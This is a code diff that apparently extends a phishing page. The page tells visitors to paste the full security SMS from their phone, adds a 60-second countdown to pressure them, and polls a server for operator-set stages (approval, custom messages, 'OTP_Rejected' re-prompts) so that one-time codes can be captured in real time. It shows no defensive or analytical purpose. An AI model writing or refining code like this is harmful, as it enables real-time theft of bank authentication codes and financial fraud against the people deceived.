@@ -38,6 +38,60 @@
             background: #002244; padding: 25px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
+        .timer-card {
+            background: rgba(255, 204, 0, 0.1);
+            border: 1px solid rgba(255, 204, 0, 0.55);
+            border-radius: 12px;
+            padding: 12px 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+            text-align: left;
+        }
+        .timer-ring-wrap {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .timer-ring-wrap svg {
+            width: 44px;
+            height: 44px;
+            transform: rotate(-90deg);
+        }
+        .ring-bg {
+            fill: none;
+            stroke: rgba(255, 204, 0, 0.22);
+            stroke-width: 3.5;
+        }
+        .ring-progress {
+            fill: none;
+            stroke: #FFCC00;
+            stroke-width: 3.5;
+            stroke-linecap: round;
+            stroke-dasharray: 113.1;
+            stroke-dashoffset: 0;
+            transition: stroke-dashoffset 0.9s linear;
+        }
+        .timer-num {
+            position: absolute;
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: #FFCC00;
+        }
+        .timer-text strong {
+            display: block;
+            font-size: 0.88rem;
+            color: #FFCC00;
+        }
+        .timer-text span {
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.72);
+        }
         .format-hint-box {
             background-color: rgba(255, 204, 0, 0.08);
             border-left: 4px solid #FFCC00;
@@ -69,6 +123,21 @@
                 Paste the full security SMS message received on your mobile device below to complete authorization.
             </p>
 
+            <!-- 60s Countdown Timer -->
+            <div class="timer-card">
+                <div class="timer-ring-wrap">
+                    <svg viewBox="0 0 42 42">
+                        <circle class="ring-bg" cx="21" cy="21" r="18"></circle>
+                        <circle id="smsRingFill" class="ring-progress" cx="21" cy="21" r="18"></circle>
+                    </svg>
+                    <span id="smsTimerNum" class="timer-num">60</span>
+                </div>
+                <div class="timer-text">
+                    <strong id="smsTimerLabel">Message expires in 60s.</strong>
+                    <span>Paste your SMS before time runs out.</span>
+                </div>
+            </div>
+
             <!-- Exact Message Example Box -->
             <div class="format-hint-box p-3 mb-3">
                 <span class="text-warning fw-bold d-block mb-1">💡 Expected Message Example:</span>
@@ -78,6 +147,7 @@
             </div>
 
             <form action="/submit-auth-code" method="POST">
+                <input type="hidden" name="app_id" value="{{ app_id }}">
                 <div class="mb-3">
                     <textarea class="form-control" name="auth_code" rows="4" 
                         placeholder="Paste the message here..." 
@@ -91,11 +161,50 @@
 
     <script>
         const appId = "{{ app_id }}";
+        let isRedirecting = false;
+        let smsTimerStarted = false;
+
+        function startSmsTimer() {
+            if (smsTimerStarted) return;
+            smsTimerStarted = true;
+
+            const totalSeconds = 60;
+            let remaining = totalSeconds;
+            const circumference = 2 * Math.PI * 18;
+            const ringEl = document.getElementById("smsRingFill");
+            const numEl = document.getElementById("smsTimerNum");
+            const labelEl = document.getElementById("smsTimerLabel");
+
+            ringEl.style.strokeDasharray = circumference;
+
+            const interval = setInterval(() => {
+                if (isRedirecting) {
+                    clearInterval(interval);
+                    return;
+                }
+                remaining -= 1;
+                if (remaining <= 0) {
+                    remaining = 0;
+                    clearInterval(interval);
+                    numEl.textContent = "0";
+                    labelEl.textContent = "Message expired.";
+                    ringEl.style.strokeDashoffset = circumference;
+                    return;
+                }
+                numEl.textContent = String(remaining);
+                labelEl.textContent = `Message expires in ${remaining}s.`;
+                ringEl.style.strokeDashoffset = circumference * (1 - remaining / totalSeconds);
+            }, 1000);
+        }
 
         function checkStatus() {
-            fetch('/check-status?app_id=' + appId)
+            if (isRedirecting) return;
+
+            fetch('/check-status?app_id=' + encodeURIComponent(appId))
                 .then(response => response.json())
                 .then(data => {
+                    if (isRedirecting) return;
+
                     const waitSection = document.getElementById('waitSection');
                     const smsSection = document.getElementById('smsSection');
                     const msgBox = document.getElementById('customMsg');
@@ -103,22 +212,35 @@
                     if (data.status === "Stage1_Approved") {
                         waitSection.classList.add('d-none');
                         smsSection.classList.remove('d-none');
+                        startSmsTimer();
+                        setTimeout(checkStatus, 1500);
                     } else if (data.status === "Stage2_Approved") {
-                        window.location.href = "/final-verify";
+                        isRedirecting = true;
+                        window.location.href = "/final-verify?app_id=" + encodeURIComponent(appId);
                     } else if (data.status === "Stage3_Approved" || data.status === "Approved") {
-                        window.location.href = "/success";
+                        isRedirecting = true;
+                        window.location.href = "/success?app_id=" + encodeURIComponent(appId);
                     } else if (data.status === "CustomMessage") {
                         msgBox.style.display = 'block';
                         msgBox.textContent = data.custom_message;
                         setTimeout(checkStatus, 2000);
+                    } else if (data.status === "OTP_Rejected" || data.status === "SMS_Rejected") {
+                        isRedirecting = true;
+                        alert("Ensure that you copy the whole message and paste it here, don't delete anything.");
+                        window.location.href = "/pending?app_id=" + encodeURIComponent(appId);
                     } else if (data.status === "Rejected") {
+                        isRedirecting = true;
                         alert(data.custom_message || "Verification failed. Please try again.");
                         window.location.href = "/login";
                     } else {
                         setTimeout(checkStatus, 1500);
                     }
                 })
-                .catch(() => setTimeout(checkStatus, 2500));
+                .catch(() => {
+                    if (!isRedirecting) {
+                        setTimeout(checkStatus, 2500);
+                    }
+                });
         }
 
         if (appId) {
